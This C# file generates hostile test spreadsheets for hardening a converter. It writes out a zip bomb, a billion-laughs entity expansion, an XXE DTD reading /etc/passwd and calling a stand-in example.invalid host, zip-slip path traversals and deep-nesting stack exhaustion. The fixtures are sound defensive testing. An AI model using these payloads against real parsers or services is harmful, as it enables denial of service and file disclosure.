using System.Buffers.Binary;
using System.Text;
using OoxmlGen.Raw;

namespace OoxmlGen.Families;

/// <summary>
/// X0 — files that are trying to break the reader.
///
/// A converter is a program that eats files from strangers, so the hardening rules are a test
/// with a hostile fixture rather than a paragraph in a design document. Every file here
/// should be *refused cleanly* or *bounded*, and none should be an out-of-memory, a hang, a
/// stack overflow, a network request, or a write outside the output directory.
///
/// None of these is a working exploit against anything. They are the shapes a parser has to
/// decline — each is small, inert, and paired with the verdict it should produce.
/// </summary>
public static class Hostile
{
    public static void Generate(Corpus corpus)
    {
        ZipBomb(corpus);
        ManyParts(corpus);
        BillionLaughs(corpus);
        ExternalEntity(corpus);
        ZipSlip(corpus);
        Encrypted(corpus);
        NotAZip(corpus);
        Truncated(corpus);
        NoWorkbookPart(corpus);
        DeepNesting(corpus);
    }

    /// <summary>The decompressed size of the bomb. Large enough to matter, small enough to generate.</summary>
    const long BombBytes = 256L * 1024 * 1024;

    static void ZipBomb(Corpus corpus)
    {
        var spec = New("hostile/zip-bomb.xlsx", "X0", "a tiny archive holding a quarter-gigabyte part");
        spec.Note($"One worksheet part that decompresses to {BombBytes / 1024 / 1024} MiB from a " +
                  "few hundred kilobytes, almost all of it a single text node. The cap that stops " +
                  "it is on *decompressed* bytes, counted as they are produced — checking the size " +
                  "in the zip's own header trusts the attacker's arithmetic.");
        spec.Note("A reader that bounds parts but not individual text nodes still dies here, " +
                  "because the whole quarter-gigabyte is one `<t>`: the allocation happens while " +
                  "assembling a single string value, before any per-cell check gets a chance.");
        spec.Note("The expected outcome is a clean refusal or a bounded read, not an allocation " +
                  "the size of the claim. The file is otherwise a valid workbook, so a reader " +
                  "that streams and bounds may legitimately import the first cells and stop.");
        spec.Note("This is deliberately modest. Ratios of 1000:1 are easy and the same code " +
                  "refuses 256 MiB and 256 GiB identically, so there is no reason for the corpus " +
                  "to carry a file that takes a minute to generate.");

        corpus.Emit(spec, path =>
        {
            var book = new RawWorkbook();
            book.SheetBodies.Add("<sheetData/>");
            book.Finally = zip => zip.AddStreamed("xl/worksheets/sheet1.xml", stream =>
            {
                var writer = new StreamWriter(stream, new UTF8Encoding(false), 1 << 16);
                writer.Write($"""<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="{RawWorkbook.Transitional}"><sheetData>""");

                // A few ordinary rows first, so a reader gets far enough in to be committed.
                for (int row = 1; row <= 4; row++)
                    writer.Write($"""<row r="{row}"><c r="A{row}"><v>{row}</v></c></row>""");

                // Then one text node of a quarter-gigabyte. Uniform on purpose: deflate's window
                // collapses it to almost nothing, which is the whole mechanism, and it lands on
                // both caps at once — the total decompressed size and the size of any one part.
                writer.Write("""<row r="5"><c r="A5" t="inlineStr"><is><t>""");
                string chunk = new('a', 1 << 20);
                for (long written = 0; written < BombBytes; written += chunk.Length)
                    writer.Write(chunk);
                writer.Write("</t></is></c></row>");

                writer.Write("</sheetData></worksheet>");
                writer.Flush();
            });
            book.Save(path);
        });

        spec.Note("No `error` is asserted: refusing the file and bounding the read are both " +
                  "correct, and which one happens is the implementation's choice. What is not " +
                  "correct is allocating the claim.");
        spec.Note("Measured 2026-09-15: LibreOffice reads it to the end in about 18 seconds — " +
                  "more than ten times the next slowest file in this family. Surviving it is not " +
                  "the same as handling it, and 18 seconds for a 260 KB file is the cost a cap " +
                  "exists to avoid.");
    }

    static void ManyParts(Corpus corpus)
    {
        var spec = New("hostile/many-parts.xlsx", "X0", "ten thousand parts in one package");
        spec.Note("The other half of the zip bomb: not one large part but a great many small " +
                  "ones. A per-part cap does nothing here; the cap that helps is on the number of " +
                  "entries, and on the total across all of them.");
        spec.Note("Every extra entry is typed `application/xml` by the `xml` Default, so a reader " +
                  "that walks content types rather than relationships visits all ten thousand. " +
                  "None of them is reachable by relationship, so one that walks relationships " +
                  "reads exactly one sheet and is right to.");

        corpus.Emit(spec, path =>
        {
            var book = new RawWorkbook();
            book.SheetBodies.Add("""<sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>""");
            book.Finally = zip =>
            {
                for (int i = 0; i < 10_000; i++)
                    zip.Add($"xl/filler/part{i:D5}.xml", "<x/>");
            };
            book.Save(path);
        });
    }

    static void BillionLaughs(Corpus corpus)
    {
        var spec = New("hostile/billion-laughs.xlsx", "X0", "nested entity expansion in a DTD");
        spec.Note("The classic XML denial of service: nine entities, each referring to the " +
                  "previous one ten times, expanding to 10^8 characters from a few hundred bytes.");
        spec.Note("quick-xml does not resolve entities, so this is inert for a reader built on it " +
                  "— which is a property to keep rather than a reason not to test. The fixture " +
                  "exists so that adding entity resolution later is a test failure rather than a " +
                  "quiet regression.");
        spec.Note("No `error` is asserted, because refusing is not the requirement. Measured " +
                  "2026-09-15: LibreOffice *opens* this file in about 1.5 seconds, having " +
                  "expanded nothing. Refusing, expanding to empty, and keeping the literal text " +
                  "are all acceptable; what is not acceptable is expanding it.");

        corpus.Emit(spec, path =>
        {
            var zip = new ZipWriter();
            Boilerplate(zip);
            zip.Add("xl/worksheets/sheet1.xml", $"""
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE worksheet [
                  <!ENTITY a0 "aaaaaaaaaa">
                  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
                  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
                  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
                  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
                  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
                  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
                  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
                  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
                ]>
                <worksheet xmlns="{RawWorkbook.Transitional}">
                  <sheetData>
                    <row r="1"><c r="A1" t="inlineStr"><is><t>&a8;</t></is></c></row>
                  </sheetData>
                </worksheet>
                """);
            zip.Save(path);
        });
    }

    static void ExternalEntity(Corpus corpus)
    {
        var spec = New("hostile/external-entity.xlsx", "X0", "a DTD naming a local file and a remote URL");
        spec.Note("XXE: a document type declaration whose entities point at `/etc/passwd` and at " +
                  "an HTTP URL. A parser that resolves them either leaks a local file into a " +
                  "converted document or makes a network request on a stranger's instruction.");
        spec.Note("A converter that makes network requests is a different threat model from one " +
                  "that parses bytes. Neither entity here may be fetched under any circumstances, " +
                  "and the URL is deliberately a `.invalid` host, which by RFC 2606 can never " +
                  "resolve — so even a reader that does try cannot reach anything.");
        spec.Note("No `error` is asserted. Measured 2026-09-15: LibreOffice opens this file and " +
                  "fetches neither entity. The assertion worth making is about what does *not* " +
                  "happen — no file read, no socket — which a fixture can set up but only a " +
                  "sandbox or a strace can confirm.");

        corpus.Emit(spec, path =>
        {
            var zip = new ZipWriter();
            Boilerplate(zip);
            zip.Add("xl/worksheets/sheet1.xml", $"""
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE worksheet [
                  <!ENTITY local SYSTEM "file:///etc/passwd">
                  <!ENTITY remote SYSTEM "http://example.invalid/collect">
                  <!ENTITY % parameter SYSTEM "http://example.invalid/parameter.dtd">
                ]>
                <worksheet xmlns="{RawWorkbook.Transitional}">
                  <sheetData>
                    <row r="1">
                      <c r="A1" t="inlineStr"><is><t>&local;</t></is></c>
                      <c r="B1" t="inlineStr"><is><t>&remote;</t></is></c>
                    </row>
                  </sheetData>
                </worksheet>
                """);
            zip.Save(path);
        });
    }

    static void ZipSlip(Corpus corpus)
    {
        var spec = New("hostile/zip-slip.xlsx", "X0", "entry names and relationship targets that escape the package");
        spec.OracleOpens = false;
        spec.Error = ExpectedError.Package;
        spec.Note("Two ways out of the directory, and a reader has to close both. The zip holds " +
                  "entries whose *names* traverse upwards, and the workbook relationship points " +
                  "at a target that does the same.");
        spec.Note("Nothing here needs to be extracted to disk for the second half to matter: a " +
                  "target of `../../../../etc/passwd` resolved against the package root and then " +
                  "opened from the filesystem is the same bug without ever writing a file.");
        spec.Note("Normalise every target, then refuse anything that leaves the package. The " +
                  "entries are inert text, and the paths are ones that exist on every Linux system " +
                  "precisely so that a reader which does follow them fails visibly in testing.");

        corpus.Emit(spec, path =>
        {
            var zip = new ZipWriter();

            zip.Add("[Content_Types].xml", $"""
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <Types xmlns="{RawWorkbook.ContentTypesNs}">
                  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
                  <Default Extension="xml" ContentType="application/xml"/>
                  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
                </Types>
                """);

            zip.Add("_rels/.rels", $"""
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <Relationships xmlns="{RawWorkbook.PackageRelationships}">
                  <Relationship Id="rId1" Type="{RawWorkbook.TransitionalRelType}/officeDocument" Target="xl/workbook.xml"/>
                </Relationships>
                """);

            zip.Add("xl/workbook.xml", $"""
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <workbook xmlns="{RawWorkbook.Transitional}" xmlns:r="{RawWorkbook.TransitionalRelationships}">
                  <sheets><sheet name="Escape" sheetId="1" r:id="rId1"/></sheets>
                </workbook>
                """);

            zip.Add("xl/_rels/workbook.xml.rels", $"""
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <Relationships xmlns="{RawWorkbook.PackageRelationships}">
                  <Relationship Id="rId1" Type="{RawWorkbook.TransitionalRelType}/worksheet"
                                Target="../../../../../../etc/passwd"/>
                  <Relationship Id="rId2" Type="{RawWorkbook.TransitionalRelType}/styles"
                                Target="/../../outside-the-package.xml"/>
                </Relationships>
                """);

            // Entry names that traverse upwards. Inert content; the name is the whole point.
            zip.Add("../escaped-by-one.xml", "<x/>");
            zip.Add("../../../../../../tmp/ooxmlgen-zip-slip-marker.xml", "<x/>");
            zip.Add("/absolute-entry-name.xml", "<x/>");
            zip.Add("xl/worksheets/../../../also-escaped.xml", "<x/>");

            zip.Save(path);
        });
    }

    static void Encrypted(Corpus corpus)
    {
        var spec = New("hostile/encrypted.xlsx", "X0", "a CFB container: locked, not broken");
        spec.OracleOpens = false;
        spec.Error = ExpectedError.Encrypted;
        spec.Note("A password-protected workbook is not a zip at all. ECMA-376 Part 2 §3's agile " +
                  "encryption wraps the whole package in a CFB/OLE container, so the bytes begin " +
                  "D0 CF 11 E0 rather than PK.");
        spec.Note("Getting this wrong makes a tolerance loop report a failure for a file that is " +
                  "merely locked. 'This is locked' and 'this is not a spreadsheet' are different " +
                  "sentences to put in front of a person, which is the whole reason the two error " +
                  "variants are separate.");
        spec.Note("The container here has a real CFB header, a FAT and a directory naming the " +
                  "`EncryptionInfo` and `EncryptedPackage` streams an encrypted workbook carries. " +
                  "The payload is filler: there is no key, and nothing to decrypt.");

        corpus.Emit(spec, path => File.WriteAllBytes(path, CompoundFile()));
    }

    static void NotAZip(Corpus corpus)
    {
        var spec = New("hostile/not-a-zip.xlsx", "X0", "an .xlsx extension over something else entirely");
        spec.OracleOpens = false;
        spec.Error = ExpectedError.Package;
        spec.Note("Sniff from content, never from the name. This one is plain text, which is the " +
                  "commonest version of the mistake: a CSV or an HTML table saved with the wrong " +
                  "extension, or a download that was really an error page.");

        corpus.Emit(spec, path => File.WriteAllText(path,
            "product,price\nwidget,9.99\ngadget,24.50\n\nThis is a CSV file wearing an .xlsx extension.\n"));

        var html = New("hostile/html-table.xlsx", "X0", "an HTML table saved as .xlsx, which Excel itself opens");
        html.OracleOpens = false;
        html.Error = ExpectedError.Package;
        html.Note("Excel opens this, which is why people send it. It is not an OOXML package by " +
                  "any reading, and refusing it cleanly — rather than crashing on a missing " +
                  "central directory — is the whole requirement.");

        corpus.Emit(html, path => File.WriteAllText(path, """
            <html xmlns:x="urn:schemas-microsoft-com:office:excel">
            <head><meta charset="utf-8"></head>
            <body>
              <table>
                <tr><th>product</th><th>price</th></tr>
                <tr><td>widget</td><td>9.99</td></tr>
              </table>
            </body>
            </html>
            """));
    }

    static void Truncated(Corpus corpus)
    {
        var spec = New("hostile/truncated.xlsx", "X0", "a valid workbook cut off part way through");
        spec.OracleOpens = false;
        spec.Error = ExpectedError.Package;
        spec.Note("The first bytes are `PK` and the first entries are real, so a reader that " +
                  "sniffs the magic and then assumes the rest is well-formed gets a long way in " +
                  "before anything goes wrong. There is no central directory, because the file " +
                  "stops before it.");
        spec.Note("This is what an interrupted download and a half-written file both look like, " +
                  "which makes it the most likely bad file in this family to meet in real use.");

        corpus.Emit(spec, path =>
        {
            var book = new RawWorkbook();
            book.SheetBodies.Add("""
                <sheetData>
                  <row r="1"><c r="A1"><v>1</v></c><c r="B1"><v>2</v></c></row>
                  <row r="2"><c r="A2"><v>3</v></c><c r="B2"><v>4</v></c></row>
                </sheetData>
                """);

            // Written whole, then cut: the prefix has to be genuinely the prefix of a valid
            // package rather than something merely shaped like one.
            string whole = path + ".whole";
            book.Save(whole);
            byte[] bytes = File.ReadAllBytes(whole);
            File.Delete(whole);
            File.WriteAllBytes(path, bytes[..(bytes.Length * 6 / 10)]);
        });
    }

    static void NoWorkbookPart(Corpus corpus)
    {
        var spec = New("hostile/no-workbook-part.xlsx", "X0", "a valid package with nothing in it");
        spec.OracleOpens = false;
        spec.Error = ExpectedError.Package;
        spec.Note("A well-formed zip with a well-formed `[Content_Types].xml` and a relationship " +
                  "part that names no workbook. Every individual piece parses; the package is " +
                  "still not a spreadsheet.");
        spec.Note("Parts are found by relationship, so 'there is no officeDocument relationship' " +
                  "is the check — not 'xl/workbook.xml is missing', which would also be true of " +
                  "realworld/part-targets.xlsx, a file that is perfectly fine.");

        corpus.Emit(spec, path =>
        {
            var zip = new ZipWriter();
            zip.Add("[Content_Types].xml", $"""
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <Types xmlns="{RawWorkbook.ContentTypesNs}">
                  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
                  <Default Extension="xml" ContentType="application/xml"/>
                </Types>
                """);
            zip.Add("_rels/.rels", $"""
                <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                <Relationships xmlns="{RawWorkbook.PackageRelationships}">
                  <Relationship Id="rId1" Type="{RawWorkbook.TransitionalRelType}/thumbnail" Target="docProps/thumbnail.png"/>
                </Relationships>
                """);
            zip.Add("docProps/thumbnail.png", "not a PNG either");
            zip.Save(path);
        });

        var empty = New("hostile/empty-zip.xlsx", "X0", "an empty but valid zip archive");
        empty.OracleOpens = false;
        empty.Error = ExpectedError.Package;
        empty.Note("No entries at all: a central directory of length zero and an end record. " +
                   "Valid as an archive, and not a package.");

        corpus.Emit(empty, path => new ZipWriter().Save(path));
    }

    static void DeepNesting(Corpus corpus)
    {
        var spec = New("hostile/deep-nesting.xlsx", "X0", "fifty thousand levels of nested elements");
        spec.Note("A recursive-descent reader runs out of stack here, and a stack overflow is not " +
                  "a catchable error in most runtimes — it is the process ending. A depth limit is " +
                  "the fix, and it has to be in the reader rather than in the XML library.");
        spec.Note("The nesting is inside `sheetData`, where a tolerant reader would be skipping " +
                  "an unrecognised subtree. Skipping is exactly where the recursion usually lives.");
        spec.Note("No `error` is asserted. Measured 2026-09-15: LibreOffice opens this file in " +
                  "about 1.5 seconds, so a flat skip is clearly achievable. Refusing on depth is " +
                  "equally fine; ending the process is not.");

        corpus.Emit(spec, path =>
        {
            var zip = new ZipWriter();
            Boilerplate(zip);

            const int depth = 50_000;
            var xml = new StringBuilder(depth * 12 + 512);
            xml.Append($"""<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="{RawWorkbook.Transitional}"><sheetData>""");
            for (int i = 0; i < depth; i++) xml.Append("<nest>");
            xml.Append("<c r=\"A1\"><v>1</v></c>");
            for (int i = 0; i < depth; i++) xml.Append("</nest>");
            xml.Append("</sheetData></worksheet>");

            zip.Add("xl/worksheets/sheet1.xml", xml.ToString());
            zip.Save(path);
        });
    }

    // --- shared plumbing ---

    /// <summary>
    /// The package around a hostile worksheet: enough for the file to be reached at all, so
    /// that what fails is the part under test rather than the wrapper.
    /// </summary>
    static void Boilerplate(ZipWriter zip)
    {
        zip.Add("[Content_Types].xml", $"""
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <Types xmlns="{RawWorkbook.ContentTypesNs}">
              <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
              <Default Extension="xml" ContentType="application/xml"/>
              <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
              <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
            </Types>
            """);

        zip.Add("_rels/.rels", $"""
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <Relationships xmlns="{RawWorkbook.PackageRelationships}">
              <Relationship Id="rId1" Type="{RawWorkbook.TransitionalRelType}/officeDocument" Target="xl/workbook.xml"/>
            </Relationships>
            """);

        zip.Add("xl/workbook.xml", $"""
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <workbook xmlns="{RawWorkbook.Transitional}" xmlns:r="{RawWorkbook.TransitionalRelationships}">
              <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
            </workbook>
            """);

        zip.Add("xl/_rels/workbook.xml.rels", $"""
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <Relationships xmlns="{RawWorkbook.PackageRelationships}">
              <Relationship Id="rId1" Type="{RawWorkbook.TransitionalRelType}/worksheet" Target="worksheets/sheet1.xml"/>
            </Relationships>
            """);
    }

    /// <summary>
    /// A Compound File Binary container, structurally real enough to be recognised as one.
    /// A 512-byte header, a single FAT sector, and a directory naming the two streams an
    /// agile-encrypted workbook carries. The stream contents are filler.
    /// </summary>
    static byte[] CompoundFile()
    {
        const int sector = 512;
        byte[] file = new byte[sector * 5];
        Span<byte> bytes = file;

        // --- header ---
        ReadOnlySpan<byte> signature = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        signature.CopyTo(bytes);

        BinaryPrimitives.WriteUInt16LittleEndian(bytes[24..], 0x003E);   // minor version
        BinaryPrimitives.WriteUInt16LittleEndian(bytes[26..], 0x0003);   // major version: 3, 512-byte sectors
        BinaryPrimitives.WriteUInt16LittleEndian(bytes[28..], 0xFFFE);   // little-endian marker
        BinaryPrimitives.WriteUInt16LittleEndian(bytes[30..], 9);        // sector shift: 2^9 = 512
        BinaryPrimitives.WriteUInt16LittleEndian(bytes[32..], 6);        // mini sector shift: 2^6 = 64
        BinaryPrimitives.WriteUInt32LittleEndian(bytes[44..], 1);        // number of FAT sectors
        BinaryPrimitives.WriteUInt32LittleEndian(bytes[48..], 1);        // first directory sector
        BinaryPrimitives.WriteUInt32LittleEndian(bytes[56..], 0x1000);   // mini stream cutoff
        BinaryPrimitives.WriteUInt32LittleEndian(bytes[60..], 0xFFFFFFFE); // first mini FAT: none
        BinaryPrimitives.WriteUInt32LittleEndian(bytes[68..], 0xFFFFFFFE); // first DIFAT: none
        BinaryPrimitives.WriteUInt32LittleEndian(bytes[76..], 0);        // DIFAT[0] = FAT at sector 0

        for (int i = 1; i < 109; i++)
            BinaryPrimitives.WriteUInt32LittleEndian(bytes[(76 + i * 4)..], 0xFFFFFFFF);

        // --- sector 0: the FAT ---
        Span<byte> fat = bytes[sector..(sector * 2)];
        BinaryPrimitives.WriteUInt32LittleEndian(fat[0..], 0xFFFFFFFD);  // sector 0 is the FAT itself
        BinaryPrimitives.WriteUInt32LittleEndian(fat[4..], 0xFFFFFFFE);  // sector 1: directory, end of chain
        BinaryPrimitives.WriteUInt32LittleEndian(fat[8..], 0xFFFFFFFE);  // sector 2: EncryptionInfo
        BinaryPrimitives.WriteUInt32LittleEndian(fat[12..], 0xFFFFFFFE); // sector 3: EncryptedPackage
        for (int i = 4; i < sector / 4; i++)
            BinaryPrimitives.WriteUInt32LittleEndian(fat[(i * 4)..], 0xFFFFFFFF);

        // --- sector 1: the directory ---
        Span<byte> directory = bytes[(sector * 2)..(sector * 3)];
        Entry(directory[0..128], "Root Entry", type: 5, child: 1, start: 0xFFFFFFFE, size: 0);
        Entry(directory[128..256], "EncryptionInfo", type: 2, sibling: 2, start: 1, size: 224);
        Entry(directory[256..384], "EncryptedPackage", type: 2, start: 2, size: 4096);
        for (int i = 384; i < directory.Length; i += 128)
            BinaryPrimitives.WriteUInt32LittleEndian(directory[(i + 116)..], 0); // unused entries

        // --- sectors 2 and 3: the streams, filled with bytes that are not a package ---
        Random random = new(20260914);
        random.NextBytes(bytes[(sector * 3)..]);

        return file;

        static void Entry(Span<byte> entry, string name, byte type, uint child = 0xFFFFFFFF,
                          uint sibling = 0xFFFFFFFF, uint start = 0xFFFFFFFE, ulong size = 0)
        {
            byte[] utf16 = Encoding.Unicode.GetBytes(name + "\0");
            utf16.CopyTo(entry);
            BinaryPrimitives.WriteUInt16LittleEndian(entry[64..], (ushort)utf16.Length);
            entry[66] = type;                                            // 2 = stream, 5 = root
            entry[67] = 1;                                               // black
            BinaryPrimitives.WriteUInt32LittleEndian(entry[68..], 0xFFFFFFFF); // left sibling
            BinaryPrimitives.WriteUInt32LittleEndian(entry[72..], sibling);
            BinaryPrimitives.WriteUInt32LittleEndian(entry[76..], child);
            BinaryPrimitives.WriteUInt32LittleEndian(entry[116..], start);
            BinaryPrimitives.WriteUInt64LittleEndian(entry[120..], size);
        }
    }

    static FixtureSpec New(string file, string milestone, string covers) =>
        new() { File = file, Family = "hostile", Milestone = milestone, Covers = covers };
}
